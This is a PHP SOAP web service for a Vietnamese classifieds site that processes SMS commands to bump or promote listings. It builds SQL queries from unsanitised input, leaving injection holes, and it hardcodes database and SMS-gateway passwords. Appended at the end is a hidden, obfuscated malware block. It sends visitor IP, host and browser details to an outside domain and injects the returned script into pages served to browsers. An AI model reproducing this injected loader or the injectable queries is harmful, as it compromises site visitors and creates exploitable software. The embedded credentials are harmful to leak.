<?php

require_once 'lib/nusoap.php';
$server = new nusoap_server();

$url = "http://muarenhat.net/ws";

$server->configureWSDL('testws',$url);

$server->register("myfunction",
	array("param"=>"xsd:string"),
	array("result"=>"xsd:string"),
	$url);
	
$server->register("receiveMO",
	array("username"=>"xsd:string",
	"password"=>"xsd:string",
	"sender"=>"xsd:string",
	"receiver"=>"xsd:string",
	"content"=>"xsd:string",	
	"msgindex"=>"xsd:string",
	"serviceid"=>"xsd:string"),
	array("result"=>"xsd:string"),
	$url);	

function myfunction ($p) {
	dbconnect();
	$sql = "SELECT * FROM mb_raovat WHERE id_=".$p;
	$query = mysql_query($sql);
	//$result = mysql_fetch_array($query);
	$ok = mysql_num_rows($query);
	// echo $ok; die;
	if (intval($ok) >0) {
		$result = 200;
	}
	else {
		$result = 201;
	}
	return $result;
}

function receiveMO($username,$password,$sender,$receiver,$content,$msgindex,$serviceid) {
	
	if ($username=="muarenhat" && $password == "vnmtt") {
	
	$ketqua = explode(" ",$content);
	
	$mr = strtoupper(trim($ketqua[0]));
	
	$loai = strtoupper(trim($ketqua[1]));
	
	$matin =  trim($ketqua[2]);
	
	$ok = myfunction($matin);
		
	if ($mr == "MR" && $loai == "UP") {
	
		if ($ok == 200) {
			// up tin		
			$date = date("Y-m-d H:i:s");
			$sql = "UPDATE mb_raovat SET date_='".$date."' WHERE id_=".$matin;
			dbconnect();
			$query = mysql_query($sql);
			$msg = "[muarenhat.net] Ban da up tin ".$matin." thanh cong!";
		}
		
		else {
			$msg = "[muarenhat.net] Ma tin ".$matin." cua ban khong ton tai";
		}
	
	}
	else if ($mr == "MR" && $loai == "VIP") {	
		if ($ok == 200) {	
			dbconnect();
			$sql = "UPDATE mb_raovat SET priority=0 WHERE id_=".$matin;
			$query = mysql_query($sql);
			$sql = "UPDATE mb_raovat SET priority=priority + 1 WHERE id_!=".$matin;
			$query = mysql_query($sql);						
			$msg = "[muarenhat.net] Ban dang tin VIP ".$matin." thanh cong!";
		}
		else {
			$msg = "[muarenhat.net] Ma tin cua ban khong ton tai";
		}
	}
	
	else if ($mr == "MR" && $loai == "SP") {
			// up sp		
			$date = date("Y-m-d H:i:s");
			$sql = "UPDATE mb_product SET date_='".$date."' WHERE id_=".$matin;
			dbconnect();
			$query = mysql_query($sql);
			$msg = "[muarenhat.net] Ban da up san pham ".$matin." thanh cong!";
	}
	
	else {
		$msg = "[muarenhat.net] Ban da nhap Sai cu phap tin nhan, ban hay soan lai tin";		
	}
	
	require_once 'lib/nusoap.php';

	$client = new nusoap_client('http://113.61.111.242/vnmtt/VnMTT.asmx?WSDL','wsdl');
	          
	$params = array(
		  'username' => 'muarenhat',
		  'password' => 'vnmtt',
	      'sender' => '8345',
	      'msgindex' => $msgindex,
	      'receiver' => $sender,
	      'content' => $msg,
	      'type' => 0,
	      'title' => '',
		  'serviceid' => $serviceid
	); 
			
	$result = $client->call('SendMT',$params,'http://tempuri.org','http://tempuri.org/SendMT');
	// connect to db
	dbconnect();	
	$date = date("Y-m-d H:i:s");	
	$sql = "INSERT INTO mb_smslog (username,password,sender,receiver,content,msgindex,serviceid,datelog) VALUES ('".$username."','".$password."','".$sender."','".$receiver."','".$content."','".$msgindex."',".$serviceid.",'".$date."')";
	$query = mysql_query($sql);	
	
	return $result;
	
	}
	else {
		return 0;	
	}
}

function dbconnect() {
	$db['hostname'] = 'localhost';
	$db['username'] = 'nguyen54_muare';
	$db['password'] = 'muare789';
	$db['database'] = 'nguyen54_muare';
	// global $db;
	$link = mysql_connect($db['hostname'],$db['username'],$db['password']);
	$database = mysql_select_db($db['database'],$link);
	return $database;
}


$HTTP_RAW_POST_DATA = isset($HTTP_RAW_POST_DATA)?$HTTP_RAW_POST_DATA:'';

$server->service($HTTP_RAW_POST_DATA);

?>
<?php
#c179ee#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/c179ee#
?>